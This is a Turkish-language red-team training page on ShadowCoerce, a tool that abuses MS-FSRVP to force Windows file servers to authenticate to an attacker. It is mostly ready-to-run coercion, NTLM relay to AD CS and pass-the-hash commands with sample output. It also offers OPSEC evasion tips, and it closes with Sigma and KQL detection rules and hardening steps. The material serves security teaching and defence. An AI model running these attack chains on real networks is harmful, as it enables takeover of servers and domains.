# ShadowCoerce

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** MS-FSRVP (File Server Remote VSS Protocol) arayüzündeki `IsPathSupported` ve `IsPathShadowCopied` fonksiyonlarını kullanarak Windows dosya sunucularını ve Domain Controller'ları saldırgana kimlik doğrulamaya zorlayan Python aracı.

---

## 1. Genel Bakış ve Amaç

**ShadowCoerce** (Filip Dragovic / @Wh04m1001 tarafından keşfedilen ve geliştirilen), Microsoft'un **MS-FSRVP (File Server Remote VSS Protocol)** mimarisindeki bir güvenlik zafiyetini istismar eden özel bir kimlik doğrulama zorlama (Authentication Coercion) aracıdır.

MS-FSRVP protokolü, uzak dosya paylaşımlarının (SMB shares) Birim Gölge Kopyalarını (Volume Shadow Copies - VSS) oluşturmak, yönetmek ve yedekleme yazılımları (örneğin Veeam, Commvault veya Windows Server Backup) ile eşgüdümlü çalıştırmak amacıyla tasarlanmıştır. Bu hizmet Windows Server sistemlerinde "File Server VSS Agent Service" rolü kurulduğunda aktif hale gelir ve `\pipe\fssagentrpc` adlı adlandırılmış boru (named pipe) üzerinden dinleme yapar.

Protokolün barındırdığı `IsPathSupported` ve `IsPathShadowCopied` RPC metotları, istemcinin sunucuya uzak bir paylaşım yolunun gölge kopya desteğini sorgulamasına olanak tanır. İstemci bu fonksiyona hedef yol olarak saldırganın kontrolündeki bir UNC adresini (`\\attacker_ip\share`) ilettiğinde, hedef sunucu bu yolun geçerliliğini denetlemek amacıyla derhal **kendi makine hesabı (NT AUTHORITY\SYSTEM)** context'inde saldırganın SMB (TCP 445) veya HTTP servisine bir kimlik doğrulama bağlantısı başlatır.

ShadowCoerce, özellikle kurumsal dosya sunucularını (File Servers), yedekleme sistemlerini ve FSRVP rolü etkinleştirilmiş sunucuları hedef alarak NTLM Relay saldırılarıyla (AD CS PKINIT veya LDAP) yetki yükseltilmesini sağlar.

```
       [ Saldırgan: ShadowCoerce ]
                    |
     1. MS-FSRVP RPC Çağrısı (Port 445 SMB IPC$ / \pipe\fssagentrpc)
        IsPathSupported(ShareName: "\\192.168.1.50\share")
                    |
                    v
       [ Hedef Dosya Sunucusu / DC (FILESRV01) ]
                    |
     2. FILESRV01$ Makine Hesabı (SYSTEM Context)
        Saldırgan Adresine SMB Bağlantısı Açar:
                    |
                    v
     ================================================ Ağ (TCP 445)
                    |
                    v
         [ Dinleyici: ntlmrelayx ] (192.168.1.50)
                    |
     3. NTLMv2 Makine Kimliğini AD CS / LDAP'a Relay Eder
                    |
                    v
         [ AD CS Sertifika Otoritesi ] ===> Makine Sertifikası Alındı!
```

### Neden Önemli?
- **Dosya Sunucularını Hedefleme:** PetitPotam ve PrinterBug çoğunlukla DC'ler üzerinde test edilirken, ShadowCoerce kurumsal ağlardaki en kritik veri depoları olan dosya sunucularını ve yedekleme sunucularını doğrudan zorlayabilir.
- **Alternatif Koersiyon Yolu:** DC üzerinde EFS ve Spooler servisleri kapatılmış olsa dahi, üzerinde dosya sunucusu rolü bulunan sistemler ShadowCoerce ile kolayca tetiklenebilir.
- **Düşük Yetkili Kullanıcı:** Etki alanındaki sıradan bir kullanıcı hesabının kimliğiyle RPC çağrısı gerçekleştirilebilir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | ShadowCoerce | DFSCoerce | PetitPotam |
|---|---|---|---|
| **Hedef Protokol** | MS-FSRVP (Volume Shadow Copy) | MS-DFSNM (DFS Namespace) | MS-EFSR (Encrypting File System) |
| **RPC Named Pipe** | `\pipe\fssagentrpc` | `\pipe\netdfs` | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **Kritik Fonksiyon** | `IsPathSupported` | `NetrDfsRemoveStdRoot` | `EfsRpcOpenFileRaw` |
| **Gereken Rol / Servis** | File Server VSS Agent Servisi | DFS Namespace Hizmeti | EFS / LSASS Hizmeti |
| **Hedef Sistem Türü** | Dosya Sunucuları / Yedekleme | Domain Controller / Üye Sunucu | Domain Controller / Tüm Sunucular |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

ShadowCoerce Impacket kütüphanesini kullanarak Python 3 üzerinden çalıştırılır.

```bash
python3 shadowcoerce.py -u <Kullanıcı> -p <Parola> -d <Etki_Alanı> <Dinleyici_IP> <Hedef_IP> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `<Dinleyici_IP>` | Hedef sunucunun SMB bağlantısı açacağı saldırgan IP adresi (Zorunlu). | `192.168.1.50` |
| `<Hedef_IP>` | Zorlanacak Windows sunucusu veya Domain Controller IP/FQDN (Zorunlu). | `192.168.1.15` |
| `-u, --username` | RPC kimlik doğrulaması için etki alanı kullanıcısı. | `-u ahmet` |
| `-p, --password` | Kullanıcının parolası. | `-p Parola123!` |
| `-d, --domain` | Hedef Active Directory etki alanı adı. | `-d lab.local` |
| `-hashes` | Parola yerine LM:NTLM hash ile kimlik doğrulama. | `-hashes :e19ccf...` |
| `-target-ip` | Hedef host adının çözümleneceği IP adresi. | `-target-ip 192.168.1.15` |
| `-k, --kerberos` | SMB/RPC oturumu için Kerberos biletlerini kullanır. | `-k` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Kimlik Doğrulamalı ShadowCoerce Tetiklemesi

Düşük yetkili bir etki alanı kullanıcısıyla hedef dosya sunucusunu dinleyiciye zorlama.

```bash
python3 shadowcoerce.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.15
```

```text
[*] Authenticating to 192.168.1.15 as lab.local\can.oz...
[+] Connected to SMB IPC$ share!
[*] Binding to MS-FSRVP RPC interface (\pipe\fssagentrpc)...
[+] Bound successfully!
[*] Calling IsPathSupported with UNC '\\192.168.1.50\share'...
[+] IsPathSupported dispatched! Check your listener!
```
*Analiz:* ShadowCoerce `\pipe\fssagentrpc` borusuna bağlandı ve `IsPathSupported` çağrısını gerçekleştirdi. Hedef dosya sunucusu anında `192.168.1.50` adresine SMB isteği gönderdi.

---

### Senaryo 2: ShadowCoerce ve ntlmrelayx ile AD CS ESC8 Sömürüsü

Tetiklenen dosya sunucusu makine hesabını AD CS'e relay ederek bilgisayar sertifikası alma.

```bash
# Terminal 1: ntlmrelayx dinleyicisini başlat
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Terminal 2: ShadowCoerce ile sunucuyu zorla
python3 shadowcoerce.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.15
```

```text
[ntlmrelayx Konsolu]
[*] HTTP Client connected from 192.168.1.15 (FILESRV01$)
[*] Relaying authentication for LAB\FILESRV01$ to AD CS Web Enrollment...
[+] Successfully requested certificate for LAB\FILESRV01$!
[*] Certificate exported to /tmp/FILESRV01.pfx
```
*Analiz:* Dosya sunucusunun makine hesabı (`FILESRV01$`) ele geçirildi. Bu sertifika ile Kerberos TGT üretilip sunucu üzerinde tam yönetim hakkı kazanılabilir.

---

### Senaryo 3: Pass-the-Hash ile NTLM Hash Kullanarak Tetikleme

Açık metin parola olmadan bellekten çekilen NTLM hash ile çalıştırma.

```bash
python3 shadowcoerce.py -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d lab.local 192.168.1.50 192.168.1.15
```

---

### Senaryo 4: rpcdump.py ile Hedefte fssagentrpc Borusunun Açık Olduğunu Doğrulama

ShadowCoerce çalıştırmadan önce hedefte MS-FSRVP servisinin açık olup olmadığını kontrol etme.

```bash
rpcdump.py lab.local/can.oz:Pass123!@192.168.1.15 | grep -i "fssagentrpc"
```

```text
Protocol: [MS-FSRVP]: File Server Remote VSS Protocol
UUID: a8e0653c-2744-4389-a61d-7373df8b2292 v1.0
Endpoint: ncacn_np:[\\pipe\\fssagentrpc]
```
*Analiz:* `\pipe\fssagentrpc` borusunun açık olduğu ve sunucunun ShadowCoerce saldırısına uygun olduğu teyit edildi.

---

### Senaryo 5: WebDAV Formatında UNC Yolu ile Tetikleme

Port 445 engellendiğinde WebClient servisine yönlendirmek için WebDAV sözdizimi kullanma.

```bash
python3 shadowcoerce.py -u can.oz -p Pass123! -d lab.local 192.168.1.50@8080/share 192.168.1.15
```

---

### Senaryo 6: Chisel / SOCKS Proxy Tüneli Üzerinden Uzaktan Koersiyon

İç ağdaki izole dosya sunucusunu bir pivot tüneli arkasından tetikleme:

```bash
proxychains python3 shadowcoerce.py -u can.oz -p Pass123! -d lab.local 10.10.14.5 192.168.20.15
```
*Analiz:* SOCKS proxy tüneli üzerinden uzaktaki izole VLAN'da bulunan dosya sunucusuna ulaşıldı ve hedef sunucu saldırganın tünel dinleyicisine kimlik doğrulamaya zorlandı.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `STATUS_OBJECT_NAME_NOT_FOUND (0xc0000034)` | Hedef sistemde `\pipe\fssagentrpc` named pipe'ı bulunamadı (File Server VSS Agent servisi yüklü değildir). | Bu sistemde FSRVP açık değildir; alternatif koersiyon araçlarına (`DFSCoerce` veya `PetitPotam`) geçin. |
| `RPC_S_ACCESS_DENIED (0x5)` | Kullanıcının RPC arayüzüne bağlanma izni yoktur veya erişim kısıtlanmıştır. | Etki alanında geçerli başka bir kullanıcı hesabı deneyin veya kimlik bilgilerini doğrulayın. |
| `WERR_NCRR_SERVER_UNAVAILABLE (0x6ba)` | Hedef IP'ye veya SMB portuna (445) ulaşılamamaktadır. | Ağ bağlantısını ve güvenlik duvarını `nc -zvw 2 <hedef> 445` ile test edin. |
| `Target connected to listener but Relay failed: Server requires signing` | Hedef sunucuda SMB Signing zorunludur. | Hedef olarak SMB yerine imzalama zorunluluğu olmayan HTTP (AD CS Web Enrollment) seçin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller / Sunucu Event ID 5145 (A network share object was accessed):**
  - Share Name: `\\*\IPC$`
  - Relative Target Name: `fssagentrpc`
  - Access Mask: `0x12019F`.
- **Windows Security Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Çağrıyı başlatan kullanıcının kimlik bilgileri.
- **Sysmon Event ID 3 (Network Connection):**
  - Hedef sunucunun `SYSTEM` context'inde harici IP adresine TCP 445 bağlantısı açması.

### 5.2 Ağ ve EDR İmzaları
- **MS-FSRVP UUID İmzası:** Ağ trafiğinde `a8e0653c-2744-4389-a61d-7373df8b2292` UUID'sine yapılan Bind çağrıları.
- **Anormal IsPathSupported Opnum:** RPC Opnum `8` (`IsPathSupported`) veya Opnum `9` çağrısının şüpheli bir UNC yolu ile gönderilmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | FSRVP RPC arayüzü üzerinden NTLM kimlik doğrulama zorlama. |
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and SMB Relay | Tetiklenen makine kimliğini AD CS veya LDAP'a relay etme. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | IPC$ ve fssagentrpc named pipe erişimi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **fssagentrpc Borusu Yoksa Hata:** Hedefte servis yoksa gereksiz hata logu üretilir. | Öncesinde `rpcdump` ile sessizce pipe kontrolü yapın. |
| **Tetikleme Sonrası Hız:** Dinleyici hazır olmadan tetikleme yapmak şüphe uyandırır. | ntlmrelayx'i tamamen başlattıktan sonra ShadowCoerce komutunu çalıştırın. |
| **Kerberos Kullanımı:** NTLM logları daha gürültülüdür. | Mümkünse `-k` (Kerberos) bayrağını kullanın. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — fssagentrpc Named Pipe Erişimi Tespiti)
```yaml
title: Potential ShadowCoerce Authentication Coercion
status: experimental
description: Sunucu IPC$ paylaşımı altında fssagentrpc named pipe erişimi ve ardından dış SMB bağlantısı.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        ShareName: '\\*\IPC$'
        RelativeTargetName: 'fssagentrpc'
    condition: selection
level: high
```

#### Tespit Kuralı (KQL — Microsoft Sentinel)
```kql
SecurityEvent
| where EventID == 5145
| where ShareName endswith "IPC$"
| where RelativeTargetName =~ "fssagentrpc"
| project TimeGenerated, Computer, Account, IpAddress, RelativeTargetName
| order by TimeGenerated desc
```

#### Sertleştirme ve Önleme Adımları
1. **File Server VSS Agent Servisini Kapatma:** İhtiyaç duyulmayan tüm sunucularda bu rol ve servis devre dışı bırakılmalıdır.
2. **RPC Filtreleri Tanımlama (RPC Filters):** Windows Filtering Platform (WFP) kullanılarak MS-FSRVP RPC arayüzüne uzaktan erişim engellenmelidir.
3. **AD CS Web Enrollment Güvenliği:** Sertifika servislerinde EPA aktif edilmeli veya HTTP uç noktaları kapatılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart kimlikli ShadowCoerce çalıştırma
python3 shadowcoerce.py -u ahmet -p Parola123 -d sirket.local 192.168.1.50 192.168.1.15
```
- **Ne Yapar?:** Hedef sunucuyu `192.168.1.50` dinleyicisine SMB üzerinden bağlanmaya zorlar.
- **Ne Zaman Kullanılır?:** Dosya sunucusu veya yedekleme sunucusunun makine hesabını tetiklemek için.
- **Parametreler:** `-u/-p/-d`: Kimlik; `192.168.1.50`: Dinleyici; `192.168.1.15`: Hedef sunucu.

```bash
# 2. Pass-the-Hash ile NTLM hash kullanarak tetikleme
python3 shadowcoerce.py -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d sirket.local 192.168.1.50 192.168.1.15
```
- **Ne Yapar?:** Parola bilmeden NTLM hash ile `fssagentrpc` borusuna bağlanır ve tetikler.
- **Ne Zaman Kullanılır?:** Bellekten yalnızca hash elde edildiğinde.
- **Parametreler:** `-hashes`: NTLM hash formatı.

```bash
# 3. ntlmrelayx ile AD CS ESC8 sertifika relay dinleyicisi
sudo impacket-ntlmrelayx -t http://ca.sirket.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```
- **Ne Yapar?:** ShadowCoerce'in tetiklediği sunucu makine hesabını yakalayıp CA'ya relay eder.
- **Ne Zaman Kullanılır?:** Sunucu sertifikası alarak sunucuyu ele geçirmek için.
- **Parametreler:** `--adcs`: AD CS modu; `--template Machine`: Bilgisayar şablonu.

```bash
# 4. Kerberos biletleri ile kimlik doğrulama (-k)
export KRB5CCNAME=/tmp/ticket.ccache
python3 shadowcoerce.py -k -no-pass -d sirket.local 192.168.1.50 192.168.1.15
```
- **Ne Yapar?:** Ccache Kerberos biletini kullanarak ShadowCoerce çağrısını yürütür.
- **Ne Zaman Kullanılır?:** NTLM kısıtlamaları olan saf Kerberos ortamlarında.
- **Parametreler:** `-k`: Kerberos kullan; `-no-pass`: Parola sorma.

```bash
# 5. Hedefte fssagentrpc pipe kontrolü (rpcdump)
rpcdump.py sirket.local/ahmet:Parola123@192.168.1.15 | grep -i "fssagentrpc"
```
- **Ne Yapar?:** Sunucu üzerinde FSRVP servisinin dinlenip dinlenmediğini doğrular.
- **Ne Zaman Kullanılır?:** ShadowCoerce çalıştırmadan önce zafiyet uygunluğunu teyit etmek için.
- **Parametreler:** `rpcdump.py`: RPC arayüz sorgulayıcı.

```bash
# 6. Coercer aracı içinden yalnızca MS-FSRVP modunu tetikleme
coercer coerce -t 192.168.1.15 -l 192.168.1.50 -u ahmet -p Parola123 -d sirket.local --filter-protocol-name MS-FSRVP
```
- **Ne Yapar?:** Coercer otomasyon motoru içinden doğrudan ShadowCoerce fonksiyonunu çağırır.
- **Ne Zaman Kullanılır?:** Coercer aracı tercih edildiğinde tek bir komutla tetiklemek için.
- **Parametreler:** `--filter-protocol-name MS-FSRVP`: Protokol filtresi.

```bash
# 7. SOCKS proxy modu ile SMB relay zinciri kurma
sudo impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks
```
- **Ne Yapar?:** ShadowCoerce ile zorlanan sunucuların kimliklerini SOCKS tünelinde saklar.
- **Ne Zaman Kullanılır?:** Relay edilen sunucular üzerinden dosya veya komut erişimi sağlamak için.
- **Parametreler:** `-socks`: SOCKS proxy başlat.

```bash
# 8. Hedef IP'yi doğrudan belirterek DNS çözümlemesini atlama (-target-ip)
python3 shadowcoerce.py -u ahmet -p Parola123 -d sirket.local -target-ip 192.168.1.15 192.168.1.50 filesrv01.sirket.local
```
- **Ne Yapar?:** DNS aramasını baypas ederek doğrudan IP üzerinden SMB oturumu açar.
- **Ne Zaman Kullanılır?:** DNS çözümleme sorunları veya gecikmeler olduğunda.
- **Parametreler:** `-target-ip`: Hedef IP sabitleme.

```powershell
# 9. Hedef sunucuda FSRM servis durumunu PowerShell ile sorgulama
Get-Service -ComputerName FILESRV01 -Name srmsvc
```
- **Ne Yapar?:** Uzak makinede File Server Resource Manager servisinin durumunu kontrol eder.
- **Ne Zaman Kullanılır?:** Windows pivot hostundan ön denetim yaparken.
- **Parametreler:** `-ComputerName`: Hedef; `-Name srmsvc`: Servis adı.

```bash
# 10. WebDAV formatında UNC adresi ile tetikleme
python3 shadowcoerce.py -u ahmet -p Parola123 -d sirket.local 192.168.1.50@8080/share 192.168.1.15
```
- **Ne Yapar?:** FSRVP servisini SMB yerine WebDAV (HTTP) üzerinden bağlantı açmaya zorlar.
- **Ne Zaman Kullanılır?:** Port 445 engellendiğinde WebClient servisine yönlendirmek için.
- **Parametreler:** `@8080/share`: WebDAV formatı.

---

## Kaynaklar

- **Resmi GitHub Deposu (ShadowCoerce):** [https://github.com/Wh04m1001/ShadowCoerce](https://github.com/Wh04m1001/ShadowCoerce)
- **Filip Dragovic — MS-FSRVP Authentication Coercion Research:** [https://wh04m1001.github.io/](https://wh04m1001.github.io/)
- **Microsoft Open Specifications — MS-FSRVP Protocol:** [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/)

---

> **Önceki:** [← DFSCoerce](./DFSCoerce.md) · **Sonraki:** [Dementor →](./Dementor.md)
